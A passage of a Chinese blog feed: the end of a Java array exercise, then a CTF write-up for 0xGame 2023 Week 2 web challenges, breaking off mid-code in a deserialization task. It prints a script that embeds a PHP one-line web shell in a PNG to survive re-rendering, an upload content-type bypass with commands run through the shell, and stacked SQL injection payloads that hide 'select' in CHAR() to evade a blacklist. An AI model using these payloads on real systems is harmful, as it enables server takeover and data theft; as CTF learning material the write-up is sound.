theirage[i1];<br><br>            <span class="hljs-keyword">if</span> (theirage[i1] % <span class="hljs-number">3</span> ==<span class="hljs-number">0</span>)&#123;<br><br>                System.out.println(<span class="hljs-string">&quot;该数字：&quot;</span> + theirage[i1] + <span class="hljs-string">&quot;可以被3整除&quot;</span>);<br><br>                i = i +<span class="hljs-number">1</span>;<br><br>            &#125;<br><br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;数组元素之和为：&quot;</span> + sum);<br>        <br>        System.out.println(<span class="hljs-string">&quot;该数组中一共有&quot;</span> + i + <span class="hljs-string">&quot;个数可被3整除&quot;</span>);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//练习：变化数据</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span> [] theirage = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">arraylength</span> <span class="hljs-operator">=</span> theirage.length;<br><br>        System.out.println(arraylength);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i1 &lt; theirage.length; i1++) &#123;<br><br>            System.out.println(theirage[i1]);<br><br>            <span class="hljs-keyword">if</span> (theirage[i1] % <span class="hljs-number">2</span> !=<span class="hljs-number">0</span>)&#123;<br><br>                <span class="hljs-type">int</span> <span class="hljs-variable">doubleit</span> <span class="hljs-operator">=</span> theirage[i1] * <span class="hljs-number">2</span>;<br><br>                theirage[i1] = doubleit;<br><br>                System.out.println(<span class="hljs-string">&quot;该数字是奇数，称2后的结果是：&quot;</span> + doubleit);<br><br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">chuer</span> <span class="hljs-operator">=</span> theirage[i1] / <span class="hljs-number">2</span>;<br><br>                theirage[i1] = chuer;<br><br>                System.out.println(<span class="hljs-string">&quot;该数字是偶数，除二后的结果是：&quot;</span> + chuer);<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i1</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i1 &lt; theirage.length; i1++) &#123;<br><br>            System.out.println(theirage[i1]);<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>数组动态初始化</p><ul><li>初始化时只指定数组长度，由系统为数组分配初始值。</li><li>格式：数据类型[] 数组名 &#x3D; new 数组类型[数组长度];</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_0xGame_Week2</title>
    <link href="/2023/10/01/%5BWeek%202%5D%20ez_upload/"/>
    <url>/2023/10/01/%5BWeek%202%5D%20ez_upload/</url>
    
    <content type="html"><![CDATA[<p>0xGame第二周，在师傅已经给了大量提示的情况下只做出两个题:(</p><span id="more"></span><hr><h3 id="Week-2-ez-upload"><a href="#Week-2-ez-upload" class="headerlink" title="[Week 2] ez_upload"></a>[Week 2] ez_upload</h3><p>根据题目猜测任意文件上传，先打开题目的附件看看有啥东西，发现会对上传的文件利用<code>imagecreatefrom点点点()</code>和<code>image点点点()</code>进行二次渲染，主要部分如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123; <span class="hljs-comment">//获得文件类型，content-type，上传一句话修改文件类型即可绕狗</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromgif</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//刚刚上传的GIF，给source</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefromjpeg</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//同上</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<br>        <span class="hljs-variable">$source</span> = <span class="hljs-title function_ invoke__">imagecreatefrompng</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<span class="hljs-comment">//同上</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION); <span class="hljs-comment">//获得文件后缀，当出现多个 . 时，结果为最后一个 . 后面的内容。</span><br><span class="hljs-variable">$filepath</span> = <span class="hljs-variable">$user_dir</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$ext</span>; <span class="hljs-comment">//将文件原始名md5加密后和user_dir拼接，后面加个.后缀。这东西作为文件的存储路径</span><br><br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]) &#123; <span class="hljs-comment">//再次检验文件类型</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/gif&quot;</span>:<br>        <span class="hljs-title function_ invoke__">imagegif</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<span class="hljs-comment">//将$source保存到$filepath中，</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/jpeg&quot;</span>: <span class="hljs-comment">//同上</span><br>        <span class="hljs-title function_ invoke__">imagejpeg</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;image/png&quot;</span>:<span class="hljs-comment">//同上</span><br>        <span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$source</span>, <span class="hljs-variable">$filepath</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid file type!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Upload avatar success! Path: &#x27;</span>.<span class="hljs-variable">$filepath</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>去网上查了有关二次渲染绕过的资料，发现有些题目是二次渲染配合<code>include</code>函数再上传图片马，但这题没给<code>include</code>函数？根据师傅的提示搜索了生成用于绕过二次渲染的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0x0e</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-number">0x23</span>,<br>           <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x2c</span>, <span class="hljs-number">0x8a</span>, <span class="hljs-number">0xd0</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0xe1</span>, <span class="hljs-number">0xae</span>,<br>           <span class="hljs-number">0x22</span>, <span class="hljs-number">0xf6</span>, <span class="hljs-number">0xd9</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xfb</span>, <span class="hljs-number">0xae</span>, <span class="hljs-number">0xcc</span>,<br>           <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xdc</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x9f</span>,<br>           <span class="hljs-number">0x67</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x5a</span>, <span class="hljs-number">0x4c</span>,<br>           <span class="hljs-number">0xa1</span>, <span class="hljs-number">0x3f</span>, <span class="hljs-number">0x7a</span>, <span class="hljs-number">0xbf</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6b</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x2d</span>,<br>           <span class="hljs-number">0x60</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7d</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0xad</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xa1</span>,<br>           <span class="hljs-number">0x66</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x33</span>);<br><br><br><br><span class="hljs-variable">$img</span> = <span class="hljs-title function_ invoke__">imagecreatetruecolor</span>(<span class="hljs-number">32</span>, <span class="hljs-number">32</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$y</span> &lt; <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += <span class="hljs-number">3</span>) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">1</span>];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+<span class="hljs-number">2</span>];<br>   <span class="hljs-variable">$color</span> = <span class="hljs-title function_ invoke__">imagecolorallocate</span>(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   <span class="hljs-title function_ invoke__">imagesetpixel</span>(<span class="hljs-variable">$img</span>, <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$y</span> / <span class="hljs-number">3</span>), <span class="hljs-number">0</span>, <span class="hljs-variable">$color</span>);<br>&#125;<br><br><span class="hljs-title function_ invoke__">imagepng</span>(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>放本地运行一下，生成<code>1.png</code>，放到HexCmp下看看：</p><p><img src="/img/ul1.png" alt="ul1"></p><p>有这么个东西：</p><p><code>&lt;?=$_GET[0]($_POST[1]);?&gt;//GET0传函数名，POST1传参数</code></p><p>先后缀改成<code>php</code>，上传时抓包把content-type字段改成<code>image/png</code>，发现上传成功，访问URL：</p><p><img src="/img/ul2.png" alt="ul2"></p><p>成功，<code>GET</code>传参<code>0=system</code>，<code>POST</code>传参<code>1=ls;</code>，先看当前目录下的文件：</p><p><img src="/img/ul3.png" alt="ul3"></p><p><code>GET</code>传参<code>0=system</code>，<code>POST</code>传参<code>1=ls /;</code>，看根目录下的文件：</p><p><img src="/img/ul4.png" alt="ul4"></p><p><code>GET</code>传参<code>0=system</code>，<code>POST</code>传参<code>1=cat /flag;</code>，得到<code>flag</code>:</p><p><code>0xGame&#123;4611f622-8577-4ac4-8f85-0b787730800c&#125;</code></p><h3 id="Week-2-ez-sqli"><a href="#Week-2-ez-sqli" class="headerlink" title="[Week 2] ez_sqli"></a>[Week 2] ez_sqli</h3><p><code>url:http://120.27.148.152:50021/?order=email</code>，师傅提示是堆叠注入，而且直接<code>select flag from flag</code>就能拿答案。</p><p>给了附件，看下源码里黑名单都有啥：</p><p><code>blacklist = [&#39;select&#39;, &#39;update&#39;, &#39;insert&#39;, &#39;delete&#39;, &#39;database&#39;, &#39;table&#39;, &#39;column&#39;, &#39;alter&#39;, &#39;create&#39;, &#39;drop&#39;, &#39;and&#39;, &#39;or&#39;, &#39;xor&#39;, &#39;if&#39;, &#39;else&#39;, &#39;then&#39;, &#39;where&#39;]</code></p><p><code>?order=id;show tables</code>这种没法用了，根据师傅提示可以使用<code>prepare</code>和<code>execute</code>结合执行，有：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>));<br><span class="hljs-keyword">PREPARE</span> hello <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@a</span>;<br><span class="hljs-keyword">EXECUTE</span> hello;#<br></code></pre></td></tr></table></figure><p>但select被过滤掉了，空格好像也不能直接用？借助<code>char()</code>函数直接把第一段全转成字符：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span class="hljs-number">97</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">117</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">44</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">48</span>,<span class="hljs-number">120</span>,<span class="hljs-number">55</span>,<span class="hljs-number">101</span>,<span class="hljs-number">44</span>,<span class="hljs-number">40</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">109</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">108</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">105</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">59</span>);<br><span class="hljs-keyword">PREPARE</span> hello <span class="hljs-keyword">FROM</span> <span class="hljs-variable">@a</span>;<br><span class="hljs-keyword">EXECUTE</span> hello;#<br><br></code></pre></td></tr></table></figure><p><code>SET @a=CHAR(115,101,108,101,99,116,32,101,120,116,114,97,99,116,118,97,108,117,101,40,49,44,99,111,110,99,97,116,40,48,120,55,101,44,40,115,101,108,101,99,116,32,102,108,97,103,32,102,114,111,109,32,102,108,97,103,32,108,105,109,105,116,32,48,44,49,41,41,41,59);PREPARE/**/hello/**/FROM/**/@a;EXECUTE/**/hello;</code></p><p><img src="/img/sqli1.png" alt="sqli1"></p><p>返回：<code>XPATH syntax error: &#39;~0xGame&#123;4286b62d-c37e-4010-ba9c-&#39;&quot;)</code>,没显示完全，好像因为报错函数只能显示32位？改下<code>payload</code>让它显示<code>flag</code>的后30位：<code>flag</code>-&gt;<code>(right(flag,30))</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?<span class="hljs-keyword">order</span><span class="hljs-operator">=</span>email;<span class="hljs-keyword">SET</span> <span class="hljs-variable">@a</span><span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">116</span>,<span class="hljs-number">114</span>,<span class="hljs-number">97</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">117</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">44</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">48</span>,<span class="hljs-number">120</span>,<span class="hljs-number">55</span>,<span class="hljs-number">101</span>,<span class="hljs-number">44</span>,<span class="hljs-number">40</span>,<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">40</span>,<span class="hljs-number">114</span>,<span class="hljs-number">105</span>,<span class="hljs-number">103</span>,<span class="hljs-number">104</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">44</span>,<span class="hljs-number">51</span>,<span class="hljs-number">48</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">109</span>,<span class="hljs-number">32</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">32</span>,<span class="hljs-number">108</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">105</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">41</span>,<span class="hljs-number">59</span>);<span class="hljs-keyword">PREPARE</span><span class="hljs-comment">/**/</span>hello<span class="hljs-comment">/**/</span><span class="hljs-keyword">FROM</span><span class="hljs-comment">/**/</span><span class="hljs-variable">@a</span>;<span class="hljs-keyword">EXECUTE</span><span class="hljs-comment">/**/</span>hello;<br></code></pre></td></tr></table></figure><p><img src="/img/sqli2.png" alt="sqli2"></p><p>拼起来得到<code>flag</code>:<code>0xGame&#123;4286b62d-c37e-4010-ba9c-35d47641fb91&#125;</code></p><h3 id="Week-2-ez-unserialize"><a href="#Week-2-ez-unserialize" class="headerlink" title="[Week 2] ez_unserialize"></a>[Week 2] ez_unserialize</h3><p>这题没做出来挺可惜的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cache</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$expired</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$helper</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$helper</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$value</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-variable">$helper</span>;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;expired = False;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">//强行把expired设置False，之前碰到都是利用修改属性个数绕过，但师傅提示需通过引用绕过</span><br>        <span class="hljs-variable language_">$this</span>-&gt;expired = False;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">expired</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;expired) &#123; <span class="hljs-comment">//如果expired为True</span><br>            <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;<span class="hljs-title function_ invoke__">clean</span>(<span class="hljs-variable">$this</span>-&gt;key);<span class="hljs-comment">//clean?好像是一个不存在的方法，通过这个调用__call</span><br>            <span class="hljs-keyword">return</span> True; <span class="hljs-comment">//返回True</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> False;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Storage</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();<span class="hljs-comment">//将一个空数组赋值给store</span><br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>) </span>&#123;<span class="hljs-comment">//给不可访问属性赋值时被调用</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;store) <br>            <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-keyword">array</span>();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">expired</span>()) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;store[<span class="hljs-variable">$name</span>] = <span class="hljs-variable">$value</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$name</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$funcs</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;funcs = <span class="hljs-variable">$funcs</span>;<span class="hljs-comment">//system函数</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$args</span></span>) </span>&#123; <span class="hljs-comment">//链子的尾，通过这个执行命令</span><br>        <span 